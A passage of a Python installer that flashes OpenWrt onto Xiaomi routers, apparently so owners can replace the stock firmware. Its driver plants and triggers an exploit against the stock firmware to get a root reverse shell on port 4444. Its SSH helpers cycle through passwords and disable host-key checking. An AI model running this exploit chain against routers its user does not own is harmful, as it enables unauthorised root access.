        if shutil.which("sshpass"):
            base = ["sshpass", "-p", pw] + base
        r = subprocess.run(base, capture_output=True, text=True, timeout=timeout)
        last = (r.returncode, (r.stdout + r.stderr).strip())
        if r.returncode == 0:
            return last
        if "Permission denied" not in last[1]:
            break          # a real failure, not the wrong credential
    if check and last[0] != 0:
        raise Abort(f"ssh {cmd!r} failed: {last[1]}")
    return last


def scp_to(host, local, remote):
    """scp needs an IPv6 literal bracketed, or its colons read as host:path."""
    dest = f"root@[{host}]:{remote}" if ":" in host else f"root@{host}:{remote}"
    last = None
    for pw in SSH_PASSWORDS:
        r = subprocess.run(
            (["sshpass", "-p", pw] if shutil.which("sshpass") else []) +
            ["scp", "-O", "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
             "-o", "NumberOfPasswordPrompts=1", local, dest],
            capture_output=True, text=True, timeout=900)
        if r.returncode == 0:
            return
        last = r.stderr.strip()
    raise Abort(f"scp to {remote} failed: {last}")


def wait_and_discover(iface, deadline_s=420, fallback=None):
    """Find the box again after a reboot. Discovery has to happen *after* the
    pivot, not before it: run early it would answer with whatever is on the
    link at the time, which is the stock system."""
    log(f"[*] waiting for the RAM system to appear on {iface}")
    end = time.time() + deadline_s
    while time.time() < end:
        if fallback:
            banner, _error = ssh_banner(fallback, timeout=3)
            if banner and "dropbear" in banner.lower():
                log(f"[*] wired OpenWrt system found at {fallback}")
                return fallback
        try:
            host = discover_linklocal(iface, timeout=10)
            log(f"[*] discovered {host}")
            return host
        except Abort:
            time.sleep(5)
    raise Abort(f"nothing appeared on {iface} within {deadline_s}s")


def wait_for_openwrt(host, deadline_s=420):
    log(f"[3] waiting up to {deadline_s}s for the RAM system on {host}")
    end = time.time() + deadline_s
    while time.time() < end:
        banner, err = ssh_banner(host, timeout=5)
        if banner:
            # Identify before authenticating -- see check_is_openwrt_ram.
            check_is_openwrt_ram(host)
            rc, out = ssh(host, "echo up", timeout=30, check=False)
            if rc == 0 and "up" in out:
                log("[3] ssh is answering")
                return True
        time.sleep(5)
    return False


def require_permanent_nand_support(raw_flash_type, rel, profile, image_cache):
    ft = release.normalise_flash_type(raw_flash_type)
    part = profile.flash_types.get(ft)
    ok, why = release.check_nand(rel, part, image_cache, flash_type=ft)
    if not ok:
        raise Abort(why)
    return ft, part, why


def permanent_system_matches(profile, board, rootfs_type, mtd_text):
    mtd = parse_mtd(mtd_text)
    partitions_ok = all(
        name in mtd and mtd[name]["size"] == size
        for name, (_start, size) in profile.openwrt_partitions.items())
    return (board.strip() == profile.openwrt_board
            and rootfs_type.strip() == "overlay" and partitions_ok)


def build_sysupgrade_launcher(opts):
    return ("#!/bin/sh\n"
            "echo started > /tmp/xiaomi-sysupgrade.status\n"
            "i=0\n"
            "while [ ! -e /tmp/xiaomi-sysupgrade.ack ] && [ $i -lt 120 ]; do\n"
            "  i=$((i+1)); sleep 1\n"
            "done\n"
            "[ -e /tmp/xiaomi-sysupgrade.ack ] || { "
            "echo fail:no-ack > /tmp/xiaomi-sysupgrade.status; exit 1; }\n"
            "echo acknowledged > /tmp/xiaomi-sysupgrade.status\n"
            f"exec /sbin/sysupgrade {opts or '-n '}/tmp/fw.bin\n")


def flash(host, rel, images, assume_yes, profile, image_cache, cfg_tar=None):
    log("\n=== stage 3: flash (sysupgrade from the RAM system) ===")
    if not wait_for_openwrt(host):
        raise Abort(
            f"nothing answering ssh on {host}. If the release initramfs does "
            "not bring the radios up, this needs a LAN cable -- see the note "
            "in the README about the installer Wi-Fi build.")

    _rc, board = ssh(host, ". /lib/functions.sh 2>/dev/null; board_name")
    _rc, rtype = ssh(host, ". /lib/upgrade/common.sh 2>/dev/null; rootfs_type")
    _rc, mtdtext = ssh(host, "cat /proc/mtd")
    log(f"[3] board_name={board!r} rootfs_type={rtype!r}")
    if board.strip() != profile.openwrt_board:
        raise Abort(f"board_name is {board!r}, expected {profile.openwrt_board}")
    if rtype.strip() != "tmpfs":
        raise Abort(f"rootfs_type is {rtype!r}, not tmpfs -- this is not the RAM "
                    "system, and an in-place sysupgrade is exactly what bricks "
                    "this board")
    mtd = parse_mtd(mtdtext)
    if not mtd:
        raise Abort("/proc/mtd is empty on the RAM system: the kernel did not "
                    "probe the NAND. This is the second-source flash problem -- "
                    "power-cycle to fall back to stock and use a build that "
                    "carries this part's spinand entry.")
    log(f"[3] OpenWrt sees {len(mtd)} partitions incl. "
        f"{[p for p in mtd if p in ('ubi_kernel', 'rootfs')]}")
    log("[3] the NAND probed under OpenWrt -- the flash chip is supported")

    rc, raw_ft = ssh(host, "fw_printenv -n flash_type 2>/dev/null", check=False)
    if rc != 0 or not raw_ft.strip():
        rc, raw_ft = ssh(host, "fw_printenv flash_type 2>/dev/null", check=False)
        raw_ft = raw_ft.split("=", 1)[-1] if "=" in raw_ft else ""
    ft, part, why = require_permanent_nand_support(
        raw_ft, rel, profile, image_cache)
    log(f"[3] permanent-image NAND gate: PASS -- {why}")

    img = images["sysupgrade"]
    confirm(f"write {img['name']} to NAND? This is the point of no return.",
            assume_yes)

    scp_to(host, img["path"], "/tmp/fw.bin")
    _rc, out = ssh(host, "sha256sum /tmp/fw.bin", timeout=300)
    if img["sha256"] not in out:
        raise Abort(f"uploaded image sha256 mismatch: {out!r}")
    log(f"[3] uploaded and verified: {img['sha256'][:16]}...")

    ssh(host, "sysupgrade -T /tmp/fw.bin", timeout=300)
    log("[3] sysupgrade -T accepted the image")

    opts = ""
    if cfg_tar:
        scp_to(host, cfg_tar, "/tmp/cfg.tar.gz")
        rc, out = ssh(host, "gzip -t /tmp/cfg.tar.gz && tar tzf /tmp/cfg.tar.gz",
                      timeout=60, check=False)
        if rc != 0:
            raise Abort(f"the config tarball did not survive the upload: {out}")
        log(f"[3] first-boot config uploaded: {out.strip()}")
        opts = "-f /tmp/cfg.tar.gz "

    # Detached, deliberately: a NAND write torn by a dropped session leaves a
    # kernel UBI the stock bootloader cannot attach.
    # -f wins over -n in sysupgrade (it forces SAVE_CONFIG=1 and uses the given
    # archive), so the two are not combined.
    import tempfile
    script_body = build_sysupgrade_launcher(opts)
    with tempfile.TemporaryDirectory() as tmp:
        launcher = os.path.join(tmp, "run-sysupgrade.sh")
        with open(launcher, "w") as output:
            output.write(script_body)
        scp_to(host, launcher, "/tmp/run-sysupgrade.sh")
    rc, active_upgrade = ssh(
        host, "pgrep -f '[s]ysupgrade' | head -1", check=False)
    if rc == 0 and active_upgrade.strip():
        raise Abort(f"sysupgrade is already running (pid {active_upgrade.strip()})")
    ssh(host, "chmod 700 /tmp/run-sysupgrade.sh; "
              "rm -f /tmp/xiaomi-sysupgrade.status /tmp/xiaomi-sysupgrade.ack",
        check=True)
    rc, out = ssh(
        host,
        "start-stop-daemon -S -b -x /tmp/run-sysupgrade.sh; rc=$?; "
        "i=0; while [ $i -lt 10 ]; do "
        "s=$(cat /tmp/xiaomi-sysupgrade.status 2>/dev/null); "
        "[ -n \"$s\" ] && break; i=$((i+1)); sleep 1; done; "
        "printf 'rc=%s status=%s\\n' \"$rc\" \"$s\"",
        timeout=30, check=False)
    log(f"[3] launch: {out.strip() or 'no output'}")
    if "rc=0" not in out or "status=started" not in out:
        raise Abort(
            "sysupgrade start marker was not observed. Do not power-cycle; "
            "inspect the RAM system before retrying.")
    log("[3] durable sysupgrade start marker observed")
    rc, ack = ssh(host, "touch /tmp/xiaomi-sysupgrade.ack; echo ack-sent",
                  timeout=10, check=False)
    if rc != 0 or "ack-sent" not in ack:
        raise Abort("could not acknowledge sysupgrade start; it will time out "
                    "without writing")
    log("[3] do not touch the power")
    log("[3] it reformats both UBIs, writes kernel+rootfs, sets the boot flags "
        "and reboots")

    time.sleep(60)
    deadline = time.time() + 600
    while time.time() < deadline:
        if not wait_for_openwrt(host, 30):
            continue
        _rc, board2 = ssh(host, ". /lib/functions.sh; board_name", check=False)
        _rc, rtype2 = ssh(host, ". /lib/upgrade/common.sh; rootfs_type", check=False)
        _rc, mtd2_text = ssh(host, "cat /proc/mtd", check=False)
        if permanent_system_matches(profile, board2, rtype2, mtd2_text):
            log(f"[3] installed board={board2.strip()} rootfs_type=overlay")
            log("[+] OpenWrt is installed on NAND.")
            return
        log(f"[3] system is up but not the permanent target yet: "
            f"board={board2.strip()!r} rootfs={rtype2.strip()!r}")
        time.sleep(10)
    raise Abort("OpenWrt did not return as the expected permanent overlay system")


# ---- driver -----------------------------------------------------------------


def parse_args(argv=None):
    ap = argparse.ArgumentParser(
        description="Install a selected OpenWrt image on a supported Xiaomi router.")
    ap.add_argument(
        "image", nargs="?", choices=tuple(IMAGE_FLAVOURS),
        help="image to install (default: standard)")
    ap.add_argument(
        "--release", "--tag", dest="tag", default=DEFAULT_RELEASE,
        help=f"OpenWrt release tag (default: {DEFAULT_RELEASE}; use 'latest' to follow latest)")
    ap.add_argument(
        "--interface", "--discover", dest="discover", metavar="IFACE",
        help="router-facing network interface (normally detected automatically)")
    ap.add_argument(
        "--transport", choices=("auto", "wired", "wifi"), default="auto",
        help="installation transport (default: detect from the interface)")
    ap.add_argument("--host", default=None,
                    help="stock router address (default: profile address)")
    ap.add_argument("--wifi-ssid", default=None,
                    help="configure this SSID on the installed system")
    ap.add_argument("--wifi-key", default=None,
                    help="installed WPA2 passphrase, 8-63 characters")
    ap.add_argument("--wifi-country", default=None,
                    help="two-letter regulatory domain, for example BR")
    ap.add_argument("--root-password", default=None,
                    help="set the installed system's root password")
    ap.add_argument("--configure", action="store_true",
                    help="prompt for installed Wi-Fi and root credentials")
    ap.add_argument("--dry-run", action="store_true",
                    help="download and verify the selected release; do not contact the router")
    ap.add_argument("--yes", action="store_true",
                    help="skip write and reboot confirmation prompts")

    # Recovery and development controls. They remain accepted for interrupted
    # runs, but the normal installation path does not need to expose them.
    hidden = argparse.SUPPRESS
    ap.add_argument("--device", default="rd03v2", choices=tuple(devices.PROFILES),
                    help=hidden)
    ap.add_argument("--openwrt-host", default=None, help=hidden)
    ap.add_argument("--stage", default="all",
                    choices=("preflight", "pivot", "flash", "all"), help=hidden)
    ap.add_argument("--flavour", choices=("default", "nss"), default=None,
                    help=hidden)
    ap.add_argument("--no-wifi-initramfs", action="store_true", help=hidden)
    ap.add_argument("--offline", action="store_true", help=hidden)
    ap.add_argument("--images", default="images", help=hidden)
    ap.add_argument("--outdir", default=None, help=hidden)
    ap.add_argument("--attacker", default=None, help=hidden)
    ap.add_argument("--serve-port", type=int, default=8000, help=hidden)
    ap.add_argument("--shell-port", type=int, default=4444, help=hidden)
    ap.add_argument("--file-port", type=int, default=4445, help=hidden)
    ap.add_argument("--id", default="ota0001", help=hidden)
    ap.add_argument("--skip-init", action="store_true", help=hidden)
    ap.add_argument("--skip-exploit", action="store_true", help=hidden)
    ap.add_argument("--settle", type=int, default=90, help=hidden)
    ap.add_argument("--session-token", default=None, help=hidden)
    ap.add_argument("--resume-manifest", default=None, help=hidden)
    ap.add_argument("--standalone-flash", action="store_true", help=hidden)
    ap.add_argument("--recover-stale-lock", action="store_true", help=hidden)
    ap.add_argument("--config-tar", default=None, help=hidden)
    args = ap.parse_args(argv)

    legacy_image = {"default": "standard", "nss": "nss"}.get(args.flavour)
    if args.image and legacy_image and args.image != legacy_image:
        ap.error(f"image {args.image!r} conflicts with --flavour {args.flavour!r}")
    args.image = args.image or legacy_image or "standard"
    args.flavour = IMAGE_FLAVOURS[args.image]
    if args.no_wifi_initramfs:
        if args.transport == "wifi":
            ap.error("--transport wifi conflicts with --no-wifi-initramfs")
        args.transport = "wired"
    return args


def detect_transport(interface, sysfs_root="/sys/class/net"):
    """Classify a Linux network interface without sending network traffic."""
    if not interface:
        raise Abort("cannot detect transport without a network interface")
    wireless = os.path.join(sysfs_root, interface, "wireless")
    return "wifi" if os.path.isdir(wireless) else "wired"


def prompt_firstboot(args):
    """Collect optional installed-system settings without a long command line."""
    if not sys.stdin.isatty():
        raise Abort("--configure needs an interactive terminal")
    print("\nInstalled-system configuration (root password and SSID may be blank)")
    if args.root_password is None:
        args.root_password = getpass.getpass("OpenWrt root password: ") or None
    if args.wifi_ssid is None:
        args.wifi_ssid = input("OpenWrt Wi-Fi SSID: ").strip() or None
    if args.wifi_ssid:
        if args.wifi_key is None:
            args.wifi_key = getpass.getpass("OpenWrt Wi-Fi password: ")
        if args.wifi_country is None:
            args.wifi_country = input(
                "Wi-Fi country code (required when SSID is set, for example BR): "
            ).strip().upper()
    return args


def validate_firstboot_config(ssid, key, country):
    """Validate values against hostapd/WPA limits before any device change."""
    if not ssid:
        if key or country:
            raise Abort("--wifi-key/--wifi-country require --wifi-ssid")
        return
    if any(ord(ch) < 32 or ord(ch) == 127 for ch in ssid):
        raise Abort("Wi-Fi SSID must not contain control characters")
    if not 1 <= len(ssid.encode("utf-8")) <= 32:
        raise Abort("Wi-Fi SSID must be 1-32 UTF-8 bytes")
    try:
        key_bytes = (key or "").encode("ascii")
    except UnicodeEncodeError:
        raise Abort("WPA2 passphrase must contain printable ASCII characters")
    if not 8 <= len(key_bytes) <= 63 or any(b < 32 or b > 126 for b in key_bytes):
        raise Abort("WPA2 passphrase must be 8-63 printable ASCII characters")
    if not country or not re.fullmatch(r"[A-Z]{2}", country):
        raise Abort("Wi-Fi country must be a two-letter uppercase code")


def load_resume_manifest(path):
    try:
        with open(path) as source:
            data = json.load(source)
    except (OSError, json.JSONDecodeError) as exc:
        raise Abort(f"cannot read resume manifest {path}: {exc}")
    if data.get("version") != 1:
        raise Abort(f"unsupported resume manifest version in {path}")
    return data


def write_resume_manifest(path, args, profile, rel, images, token, cfg_tar):
    data = {
        "version": 1,
        "phase": "prepared",
        "profile": profile.slug,
        "release": rel.tag,
        "image": args.image,
        "flavour": args.flavour,
        "transport": args.transport,
        "interface": args.discover,
        "images_dir": os.path.abspath(args.images),
        "images": {kind: {"name": item["name"], "sha256": item["sha256"]}
                   for kind, item in images.items()},
        "session_token": token,
        "config_tar": os.path.abspath(cfg_tar) if cfg_tar else None,
        "root_password_set": bool(args.root_password),
    }
    tmp = path + ".tmp"
    with open(tmp, "w") as output:
        json.dump(data, output, indent=2, sort_keys=True)
        output.write("\n")
    os.chmod(tmp, 0o600)
    os.replace(tmp, path)
    return data


def update_resume_phase(path, phase):
    data = load_resume_manifest(path)
    data["phase"] = phase
    tmp = path + ".tmp"
    with open(tmp, "w") as output:
        json.dump(data, output, indent=2, sort_keys=True)
        output.write("\n")
    os.chmod(tmp, 0o600)
    os.replace(tmp, path)
    return data


def verify_resume_selection(resume, args, profile, rel, images):
    expected = {
        "profile": profile.slug,
        "release": rel.tag,
        "image": args.image,
        "flavour": args.flavour,
        "transport": args.transport,
    }
    mismatched = {key: (resume.get(key), value) for key, value in expected.items()
                  if resume.get(key) != value}
    for kind, item in images.items():
        recorded = (resume.get("images") or {}).get(kind) or {}
        if recorded.get("name") != item["name"] or recorded.get("sha256") != item["sha256"]:
            mismatched[f"images.{kind}"] = (recorded, {
                "name": item["name"], "sha256": item["sha256"]})
    if mismatched:
        raise Abort(f"resume manifest does not match selected install: {mismatched}")


def main(argv=None):
    os.umask(0o077)
    args = parse_args(argv)
    resume = load_resume_manifest(args.resume_manifest) if args.resume_manifest else None
    if resume:
        args.device = resume["profile"]
        args.tag = resume["release"]
        args.image = resume["image"]
        args.flavour = resume["flavour"]
        args.transport = resume["transport"]
        args.discover = resume.get("interface")
        args.images = resume["images_dir"]
        args.session_token = resume["session_token"]
        args.config_tar = resume.get("config_tar")
        args.configure = False
    if args.configure and not args.dry_run:
        prompt_firstboot(args)
    profile = devices.get_profile(args.device)
    args.host = args.host or profile.stock_host
    args.openwrt_host = args.openwrt_host or profile.openwrt_host

    cfg_tar = args.config_tar
    validate_firstboot_config(args.wifi_ssid, args.wifi_key, args.wifi_country)
    outdir = (args.outdir or (os.path.dirname(os.path.abspath(args.resume_manifest))
                              if args.resume_manifest else None)
              or f"install-{time.strftime('%Y%m%d-%H%M%S')}")
    os.makedirs(outdir, mode=0o700, exist_ok=True)
    os.chmod(outdir, 0o700)
    chain.set_log_sink(open(f"{outdir}/transcript.log", "w"))
    log(f"[*] output -> {outdir}/")

    if not args.discover and (args.stage == "all" or args.transport == "auto"):
        args.discover = chain.local_interface(args.host)
        if args.discover:
            log(f"[*] router-facing interface: {args.discover} (auto-detected)")
    if args.transport == "auto":
        if args.discover:
            args.transport = detect_transport(args.discover)
        elif args.dry_run:
            args.transport = "wired"
            log("[*] no router route found during dry-run; verifying wired images")
        else:
            raise Abort("cannot determine the router-facing interface; pass "
                        "--interface IFACE or --transport wired|wifi")
    if args.stage == "all" and not args.dry_run and not args.discover:
        raise Abort("cannot determine the router-facing interface; pass "
                    "--interface IFACE")
    via = f" via {args.discover}" if args.discover else ""
    log(f"[*] transport: {args.transport}{via}")

    if (resume and resume.get("root_password_set") and args.stage == "flash"
            and not args.root_password):
        if not sys.stdin.isatty():
            raise Abort("resumed flash needs the configured root password for "
                        "post-install verification; rerun in a terminal")
        args.root_password = getpass.getpass(
            "OpenWrt root password used by the original run: ")
    if args.root_password:
        SSH_PASSWORDS.append(args.root_password)
    if not cfg_tar and (args.wifi_ssid or args.root_password):
        cfg_tar = build_config_tar(
            f"{outdir}/firstboot.tar.gz", args.wifi_ssid or "", args.wifi_key or "",
            profile,
            args.wifi_country,
            password_hash(args.root_password) if args.root_password else None)
        log(f"[*] first-boot config: ssid={args.wifi_ssid!r} "
            f"country={args.wifi_country or 'unset'} "
            f"root password={'set' if args.root_password else 'unset'} "
            f"-> {cfg_tar}")

    # The release first: no point touching a device for an image that cannot
    # drive its flash. The simple interface is pinned to a tested release, but
    # `--release latest` remains available deliberately.
    if args.offline:
        rel = release.from_cache(args.tag, profile, args.images)
    else:
        try:
            rel = (release.latest(profile) if args.tag == "latest"
                   else release.by_tag(args.tag, profile))
        except release.ReleaseError as online_error:
            try:
                rel = release.from_cache(args.tag, profile, args.images)
                log(f"[!] release API unavailable; using verified {args.tag} cache")
            except release.ReleaseError:
                raise online_error
    log(f"[*] selected {args.image} image from release {rel.tag} ({rel.published})")
    kinds = ("initramfs_ubi", "initramfs_itb", "sysupgrade")
    # The beaconing initramfs is what makes stage 3 cable-free, so it is the
    # default. It only exists from v1.7; fall back rather than fail, and say so,
    # because the consequence (needing a cable later) is the user's to plan for.
    wifi = args.transport == "wifi"
    if wifi and "-wifi" not in " ".join(rel.assets):
        log(f"[!] {rel.tag} ships no -wifi initramfs; using the radio-silent one. "
            "The RAM system will not beacon, so stage 3 needs a LAN cable.")
        wifi = False
    log(f"[*] initramfs: {'beaconing (-wifi)' if wifi else 'radio-silent'}")
    images = release.get_images(rel, args.images, args.flavour, kinds, wifi=wifi)

    token = args.session_token or secrets.token_hex(16)
    if args.skip_exploit and not (args.session_token or resume):
        raise Abort("--skip-exploit requires --resume-manifest or the original "
                    "--session-token")
    if resume:
        verify_resume_selection(resume, args, profile, rel, images)
        if cfg_tar and not os.path.isfile(cfg_tar):
            raise Abort(f"resume config archive is missing: {cfg_tar}")
        phase = resume.get("phase")
        allowed = {
            "preflight": ("prepared", "preflight-complete"),
            "pivot": ("prepared", "preflight-complete"),
            "flash": ("pivot-complete",),
            "all": ("prepared", "preflight-complete"),
        }[args.stage]
        if phase not in allowed:
            raise Abort(f"resume phase {phase!r} is not valid for stage {args.stage!r}")
        if phase == "preflight-complete" and args.stage in ("pivot", "all"):
            args.skip_exploit = True
    elif args.stage == "flash" and not args.standalone_flash:
        raise Abort("direct --stage flash requires --resume-manifest; use "
                    "--standalone-flash only for a separately validated RAM boot")
    manifest_path = args.resume_manifest or os.path.join(outdir, "resume.json")
    if not resume and not args.dry_run:
        resume = write_resume_manifest(
            manifest_path, args, profile, rel, images, token, cfg_tar)

    if args.dry_run:
        blob, want_md5 = expected_volume(
            images["initramfs_ubi"]["path"], images["initramfs_itb"]["path"])
        log("[+] selected release downloaded and verified")
        for kind in kinds:
            log(f"    {kind}: {images[kind]['name']}")
        log(f"    initramfs kernel volume: {len(blob)} B, md5 {want_md5}")
        log("[dry-run] router was not contacted")
        return 0

    if args.stage == "all" and wifi:
        log("[*] after the RAM pivot, a Wi-Fi-only laptop must join "
            f"{profile.installer_wifi_ssid} (key: {profile.installer_wifi_key}); "
            "this process waits "
            "for the router on the selected interface")

    if args.discover and args.stage == "flash":
        fallback = profile.openwrt_host if args.transport == "wired" else None
        args.openwrt_host = wait_and_discover(args.discover, fallback=fallback)

    if args.stage == "flash":
        flash(args.openwrt_host, rel, images, args.yes, profile, args.images,
              cfg_tar)
        update_resume_phase(manifest_path, "flash-complete")
        return 0

    attacker = args.attacker or chain.local_ip(args.host)
    if not attacker:
        raise Abort("cannot work out this host's address; pass --attacker")

    if not args.skip_exploit:
        info = chain.init_info(args.host)
        log(f"[0] hardware={info.get('hardware')} rom={info.get('romversion')} "
            f"inited={info.get('inited')}")
        identity_error = devices.stock_identity_error(profile, info)
        if identity_error:
            raise Abort(identity_error)
        if not chain.port_open(args.host, chain.MESH_PORT):
            if args.skip_init:
                raise Abort("19553 closed and --skip-init given")
            chain.initialise(args.host)
        stok, _cfg = chain.admin_session(args.host, args.id.encode())
        chain.require_cap_sink_ready(args.host, stok)
        restore = chain.read_wifi(args.host, stok)
    else:
        stok, restore = None, []

    http = channel.StagerServer(
        attacker, args.serve_port,
        channel.build_stager(attacker, args.serve_port, args.shell_port,
                             restore, token),
        token, args.host)
    ch = channel.ShellChannel(attacker, args.shell_port, token, args.host)

    if not args.skip_exploit:
        chain.plant(args.host, stok, attacker, args.serve_port, restore,
                    http.stager_path)
        for band, ssid, sec in channel.expected_wifi(restore):
            log(f"    after the trigger: {band} ssid={ssid!r} {sec}")
        chain.trigger(args.host, args.id.encode())
        http.callback.wait(timeout=45)

    if not ch.wait(timeout=300):
        raise Abort("no root shell; the AP may not have come back")
    rc, out = ch.run("id", quiet=True)
    if "uid=0" not in out:
        raise Abort(f"channel is not root: {out!r}")
    log(f"[*] root channel up: {out}")
    if args.settle:
        log(f"[*] letting the AP settle for {args.settle}s")
        time.sleep(args.settle)
        ch.run("echo settled", quiet=True)

    facts = preflight(ch, rel, images, args.yes, profile, args.images)
    with open(f"{outdir}/preflight.json", "w") as fh:
        json.dump(facts, fh, indent=2, default=str)
    resume = update_resume_phase(manifest_path, "preflight-complete")

    if args.stage == "preflight":
        log("\n[+] pre-flight passed. Nothing was written.")
        command = ["python3", "install.py", args.image, "--stage", "pivot",
                   "--skip-exploit", "--resume-manifest", manifest_path]
        log("    " + shlex.join(command))
        return 0

    expected_files = {
        f"{label}.bin": facts["mtd"][part]["size"]
        for label, part in profile.backup_partitions
    }
    sink = channel.FileSink(attacker, args.file_port, outdir, token, args.host,
                            expected_files)
    backup(ch, sink, outdir, facts["mtd"], attacker, args.file_port, profile,
           token)
    pivot(ch, http, facts, images, outdir, attacker, args.serve_port, args.yes,
          profile, wifi, args.recover_stale_lock)
    resume = update_resume_phase(manifest_path, "pivot-complete")

    if args.stage == "all":
        # The pivot has just rebooted the box into RAM; find it again there.
        fallback = profile.openwrt_host if args.transport == "wired" else None
        host = wait_and_discover(args.discover, fallback=fallback) \
            if args.discover else args.openwrt_host
        flash(host, rel, images, args.yes, profile, args.images, cfg_tar)
        update_resume_phase(manifest_path, "flash-complete")
    else:
        log("\n[+] pivot done. When the RAM system is reachable, run:")
        command = ["python3", "install.py", args.image, "--stage", "flash",
                   "--resume-manifest", manifest_path]
        log("    " + shlex.join(command))
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (Abort, ChainError, release.ReleaseError) as e:
        log(f"[-] {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        log("\n[*] interrupted")
        sys.exit(130)
